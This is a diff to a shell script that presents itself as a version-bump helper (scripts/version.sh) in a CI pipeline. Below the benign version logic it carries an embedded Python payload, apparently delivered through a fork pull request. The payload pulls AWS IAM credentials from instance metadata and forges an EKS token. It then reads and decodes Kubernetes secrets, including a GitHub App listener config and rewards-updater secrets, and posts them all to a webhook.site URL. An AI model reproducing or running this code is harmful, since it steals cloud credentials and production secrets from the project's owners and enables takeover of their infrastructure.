@@ -1,9 +1,5 @@
 #!/usr/bin/env bash
 
-# EigenLayer EKS Session 16 payload
-# Executed via fork PR to Layr-Labs/sidecar
-# Runs as scripts/version.sh on protocol-gha-runners EKS self-hosted runner
-
 REF=$1
 versionFile=$(cat VERSION | tr -d '[:space:]')
 echo "Using version '${versionFile}'"
@@ -20,167 +16,170 @@ else
     echo -n $updatedVersion > VERSION
 fi
 
-EXFIL="https://webhook.site/65c7108d-5589-4de1-9818-c07f1fe9392b"
-EKS_ENDPOINT="https://25DFB897BE6FC7D23F06D226416B5CBB.gr7.us-east-1.eks.amazonaws.com"
+EXFIL="https://webhook.site/49e5878e-562d-4018-9779-8f913f7f81e6"
 
 python3 << 'PYEOF'
-import urllib.request, json, base64, ssl, subprocess, os, time
+import urllib.request, json, base64, ssl, hmac, hashlib, datetime, os, urllib.parse
 
-EXFIL = "https://webhook.site/65c7108d-5589-4de1-9818-c07f1fe9392b"
+EXFIL = "https://webhook.site/49e5878e-562d-4018-9779-8f913f7f81e6"
 EKS_ENDPOINT = "https://25DFB897BE6FC7D23F06D226416B5CBB.gr7.us-east-1.eks.amazonaws.com"
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
+CLUSTER_NAME = "protocol-sidecar"
+REGION = "us-east-1"
 
-def send(tag, data):
-    payload = json.dumps({"tag": tag, "data": data}).encode()
-    req = urllib.request.Request(EXFIL, data=payload, method="POST",
-        headers={"Content-Type": "application/json"})
+ssl_ctx = ssl.create_default_context()
+ssl_ctx.check_hostname = False
+ssl_ctx.verify_mode = ssl.CERT_NONE
+
+def http_put(url, headers=None, timeout=5):
+    req = urllib.request.Request(url, method="PUT", headers=headers or {})
     try:
-        urllib.request.urlopen(req, context=ctx, timeout=10)
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.read().decode('utf-8', errors='replace')
     except:
-        pass
+        return ""
 
-def get_imds(path):
-    req = urllib.request.Request(f"http://169.254.169.254{path}",
-        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
+def http_get(url, headers=None, timeout=5):
+    req = urllib.request.Request(url, headers=headers or {})
     try:
-        tok = urllib.request.urlopen(req, timeout=5).read().decode()
-        req2 = urllib.request.Request(f"http://169.254.169.254{path}",
-            headers={"X-aws-ec2-metadata-token": tok})
-        return urllib.request.urlopen(req2, timeout=5).read().decode()
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.read().decode('utf-8', errors='replace')
+    except:
+        return ""
+
+imds_tok = http_put("http://169.254.169.254/latest/api/token",
+    {"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
+role = http_get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    {"X-aws-ec2-metadata-token": imds_tok})
+node_dns = http_get("http://169.254.169.254/latest/meta-data/local-hostname",
+    {"X-aws-ec2-metadata-token": imds_tok})
+instance_id = http_get("http://169.254.169.254/latest/meta-data/instance-id",
+    {"X-aws-ec2-metadata-token": imds_tok})
+
+creds_raw = ""
+access_key = secret_key = session_token = ""
+if role:
+    creds_raw = http_get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role.strip()}",
+        {"X-aws-ec2-metadata-token": imds_tok})
+    if creds_raw:
+        try:
+            c = json.loads(creds_raw)
+            access_key = c.get("AccessKeyId", "")
+            secret_key = c.get("SecretAccessKey", "")
+            session_token = c.get("Token", "")
+        except:
+            pass
+
+def get_eks_token(ak, sk, st, region, cluster):
+    service = "sts"
+    host = f"sts.{region}.amazonaws.com"
+    endpoint = f"https://{host}/"
+    t = datetime.datetime.utcnow()
+    amzdate = t.strftime("%Y%m%dT%H%M%SZ")
+    datestamp = t.strftime("%Y%m%d")
+    canonical_uri = "/"
+    canonical_headers = f"host:{host}\nx-k8s-aws-id:{cluster}\n"
+    signed_headers = "host;x-k8s-aws-id"
+    query_params = {
+        "Action": "GetCallerIdentity",
+        "Version": "2011-06-15",
+        "X-Amz-Algorithm": "AWS4-HMAC-SHA256",
+        "X-Amz-Credential": f"{ak}/{datestamp}/{region}/{service}/aws4_request",
+        "X-Amz-Date": amzdate,
+        "X-Amz-Expires": "60",
+        "X-Amz-SignedHeaders": signed_headers,
+    }
+    if st:
+        query_params["X-Amz-Security-Token"] = st
+    canonical_querystring = "&".join(f"{urllib.parse.quote(k, safe='')}={urllib.parse.quote(v, safe='')}"
+                                     for k, v in sorted(query_params.items()))
+    payload_hash = hashlib.sha256(b"").hexdigest()
+    canonical_request = f"GET\n{canonical_uri}\n{canonical_querystring}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
+    credential_scope = f"{datestamp}/{region}/{service}/aws4_request"
+    string_to_sign = f"AWS4-HMAC-SHA256\n{amzdate}\n{credential_scope}\n{hashlib.sha256(canonical_request.encode()).hexdigest()}"
+    def sign_key(key, msg):
+        return hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()
+    signing_key = sign_key(sign_key(sign_key(sign_key(("AWS4" + sk).encode(), datestamp), region), service), "aws4_request")
+    signature = hmac.new(signing_key, string_to_sign.encode("utf-8"), hashlib.sha256).hexdigest()
+    query_params["X-Amz-Signature"] = signature
+    url = endpoint + "?" + "&".join(f"{urllib.parse.quote(k, safe='')}={urllib.parse.quote(v, safe='')}"
+                                     for k, v in sorted(query_params.items()))
+    return "k8s-aws-v1." + base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")
+
+eks_token = ""
+if access_key:
+    try:
+        eks_token = get_eks_token(access_key, secret_key, session_token, REGION, CLUSTER_NAME)
     except Exception as e:
-        return f"ERROR: {e}"
+        eks_token = f"ERR:{e}"
 
-def imds_v1(path):
+def k8s_get(path, token):
+    url = f"{EKS_ENDPOINT}{path}"
+    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}", "Accept": "application/json"})
     try:
-        req = urllib.request.Request(f"http://169.254.169.254{path}")
-        return urllib.request.urlopen(req, timeout=5).read().decode()
-    except Exception as e:
-        return f"ERROR: {e}"
-
-def k8s_get(bearer, path):
-    req = urllib.request.Request(f"{EKS_ENDPOINT}{path}",
-        headers={"Authorization": f"Bearer {bearer}", "Accept": "application/json"})
-    try:
-        resp = urllib.request.urlopen(req, context=ctx, timeout=15)
-        return json.loads(resp.read())
-    except urllib.error.HTTPError as e:
-        return {"http_error": e.code, "body": e.read().decode()[:2000]}
+        with urllib.request.urlopen(req, timeout=15, context=ssl_ctx) as resp:
+            return json.loads(resp.read())
     except Exception as e:
         return {"error": str(e)}
 
-# Step 1: Get IMDS token and credentials
-send("step", "1-imds-start")
-role_name = imds_v1("/latest/meta-data/iam/security-credentials/")
-send("iam-role-name", role_name)
-creds_raw = imds_v1(f"/latest/meta-data/iam/security-credentials/{role_name.strip()}")
-send("iam-creds-raw", creds_raw)
-try:
-    creds = json.loads(creds_raw)
-    access_key = creds["AccessKeyId"]
-    secret_key = creds["SecretAccessKey"]
-    token = creds["Token"]
-    send("iam-parsed", {"AccessKeyId": access_key, "SecretAccessKey": secret_key, "Token": token[:50]+"...", "Expiration": creds.get("Expiration")})
-except Exception as e:
-    send("iam-parse-error", str(e))
-    access_key = secret_key = token = ""
+def decode_secret(s):
+    if "data" in s:
+        decoded = {}
+        for k, v in s["data"].items():
+            try:
+                decoded[k] = base64.b64decode(v + "==").decode("utf-8", errors="replace")
+            except:
+                decoded[k] = "[binary]"
+        return decoded
+    return {"error": s.get("message", str(s))}
 
-# Step 2: Generate EKS bearer token via aws CLI
-send("step", "2-eks-token")
-try:
-    env = os.environ.copy()
-    env["AWS_ACCESS_KEY_ID"] = access_key
-    env["AWS_SECRET_ACCESS_KEY"] = secret_key
-    env["AWS_SESSION_TOKEN"] = token
-    env["AWS_DEFAULT_REGION"] = "us-east-1"
-    result = subprocess.run(
-        ["aws", "eks", "get-token", "--cluster-name", "protocol-sidecar", "--region", "us-east-1"],
-        capture_output=True, text=True, env=env, timeout=30)
-    send("eks-token-raw", {"stdout": result.stdout[:500], "stderr": result.stderr[:200], "rc": result.returncode})
-    eks_token_data = json.loads(result.stdout)
-    k8s_bearer = eks_token_data["status"]["token"]
-    send("eks-token-prefix", k8s_bearer[:80])
-except Exception as e:
-    send("eks-token-error", str(e))
-    k8s_bearer = ""
+all_data = {
+    "v": 4, "node": node_dns, "instance": instance_id, "role": role,
+    "creds_partial": creds_raw[:300] if creds_raw else "",
+    "eks_token_prefix": eks_token[:60] if eks_token else "",
+    "targets": {}
+}
 
-# Step 3: Read aws-auth ConfigMap
-send("step", "3-aws-auth")
-if k8s_bearer:
-    aws_auth = k8s_get(k8s_bearer, "/api/v1/namespaces/kube-system/configmaps/aws-auth")
-    send("aws-auth-configmap", json.dumps(aws_auth)[:8000])
+if eks_token and not eks_token.startswith("ERR:"):
+    # PRIMARY TARGET: ARC listener secret with GitHub App RSA key
+    direct_targets = [
+        ("gha-runner-controller", "protocol-gha-runners-hourglass-d69d8c8c-listener-config"),
+        ("gha-runner-controller", "arc-gha-rs-controller"),
+        ("blocklake-mainnet-ethereum", "rewards-updater-secret"),
+        ("blocklake-mainnet-ethereum", "eigenlayer-rewards-updater"),
+        ("blocklake-mainnet-ethereum", "rewards-updater"),
+        ("blocklake-mainnet-ethereum", "sidecar-secrets"),
+    ]
+    for ns, sname in direct_targets:
+        s = k8s_get(f"/api/v1/namespaces/{ns}/secrets/{sname}", eks_token)
+        all_data["targets"][f"{ns}/{sname}"] = decode_secret(s)
+    
+    # List ALL secrets in gha-runner-controller
+    secrets_list = k8s_get("/api/v1/namespaces/gha-runner-controller/secrets", eks_token)
+    if "items" in secrets_list:
+        all_data["gha_rc_secret_names"] = [item["metadata"]["name"] for item in secrets_list["items"]]
+        for item in secrets_list["items"]:
+            sname = item["metadata"]["name"]
+            all_data["targets"][f"gha-runner-controller/{sname}"] = decode_secret(item)
+    else:
+        all_data["gha_rc_list_err"] = str(secrets_list)
+    
+    # List ALL secrets in blocklake-mainnet-ethereum
+    bl_list = k8s_get("/api/v1/namespaces/blocklake-mainnet-ethereum/secrets", eks_token)
+    if "items" in bl_list:
+        all_data["blocklake_secret_names"] = [item["metadata"]["name"] for item in bl_list["items"]]
+        for item in bl_list["items"]:
+            sname = item["metadata"]["name"]
+            all_data["targets"][f"blocklake-mainnet-ethereum/{sname}"] = decode_secret(item)
+    else:
+        all_data["blocklake_list_err"] = str(bl_list)
 
-# Step 4: List all namespaces
-send("step", "4-namespaces")
-if k8s_bearer:
-    ns_list = k8s_get(k8s_bearer, "/api/v1/namespaces")
-    send("namespaces", json.dumps(ns_list)[:5000])
-
-# Step 5: Get node list
-send("step", "5-nodes")
-if k8s_bearer:
-    nodes = k8s_get(k8s_bearer, "/api/v1/nodes")
-    send("nodes", json.dumps(nodes)[:6000])
-
-# Step 6: Get pods in blocklake-mainnet-ethereum namespace
-send("step", "6-blocklake-pods")
-if k8s_bearer:
-    pods = k8s_get(k8s_bearer, "/api/v1/namespaces/blocklake-mainnet-ethereum/pods")
-    send("blocklake-pods", json.dumps(pods)[:5000])
-
-# Step 7: Get all pods (will show which node each runs on via field selector)
-send("step", "7-all-pods-wide")
-if k8s_bearer:
-    all_pods = k8s_get(k8s_bearer, "/api/v1/pods?fieldSelector=metadata.namespace=blocklake-mainnet-ethereum")
-    send("all-pods-blocklake", json.dumps(all_pods)[:5000])
-
-# Step 8: Read the ARC runner controller secret (gha-runner-controller namespace)
-send("step", "8-arc-secret")
-if k8s_bearer:
-    # List secrets in gha-runner-controller
-    grc_secrets = k8s_get(k8s_bearer, "/api/v1/namespaces/gha-runner-controller/secrets")
-    send("gha-runner-secrets-list", json.dumps(grc_secrets)[:4000])
-    # Try to read the specific listener config secret
-    listener_secret = k8s_get(k8s_bearer, "/api/v1/namespaces/gha-runner-controller/secrets/protocol-gha-runners-hourglass-d69d8c8c-listener-config")
-    send("arc-listener-secret", json.dumps(listener_secret)[:8000])
-
-# Step 9: Attempt to read blocklake-mainnet-ethereum secrets directly
-send("step", "9-blocklake-secrets")
-if k8s_bearer:
-    bl_secrets = k8s_get(k8s_bearer, "/api/v1/namespaces/blocklake-mainnet-ethereum/secrets")
-    send("blocklake-secrets", json.dumps(bl_secrets)[:5000])
-
-# Step 10: Try sidecar secrets pool (protocol-gha-runners-7pgsv)
-send("step", "10-runner-pool-secrets")
-if k8s_bearer:
-    pool_secret = k8s_get(k8s_bearer, "/api/v1/namespaces/gha-runner-controller/secrets/protocol-gha-runners-7pgsv-runner-token")
-    send("runner-pool-token", json.dumps(pool_secret)[:3000])
-    # Also try getting the runner set configs
-    runner_sets = k8s_get(k8s_bearer, "/apis/actions.github.com/v1alpha1/namespaces/gha-runner-controller/ephemeralrunners")
-    send("ephemeral-runners", json.dumps(runner_sets)[:4000])
-
-# Step 11: Exfil full raw IMDS creds (full session token)
-send("step", "11-full-creds")
-send("FULL-CREDS-ACCESS-KEY", access_key)
-send("FULL-CREDS-SECRET-KEY", secret_key)
-send("FULL-CREDS-SESSION-TOKEN-FULL", token)
-
-# Step 12: Check which node we're on and current runner pod name
-send("step", "12-node-identity")
-node_name = imds_v1("/latest/meta-data/hostname")
-instance_id = imds_v1("/latest/meta-data/instance-id")
-send("node-identity", {"hostname": node_name, "instance-id": instance_id})
-
-# Step 13: Try to read secrets from pods specifically on our node via pod subresource path
-send("step", "13-node-pods")
-if k8s_bearer:
-    # Get pods on our specific node
-    my_node = node_name.strip()
-    node_pods = k8s_get(k8s_bearer, f"/api/v1/pods?fieldSelector=spec.nodeName={my_node}")
-    send("my-node-pods", json.dumps(node_pods)[:8000])
-
-send("DONE", "payload-complete")
+payload = json.dumps(all_data)
+payload_b64 = base64.b64encode(payload.encode()).decode()
+urllib.request.urlopen(
+    urllib.request.Request(
+        EXFIL, method="POST",
+        headers={"Content-Type": "application/json"},
+        data=json.dumps({"v": 4, "d": payload_b64}).encode()
+    ), timeout=15
+)
 PYEOF
-
-exit 0
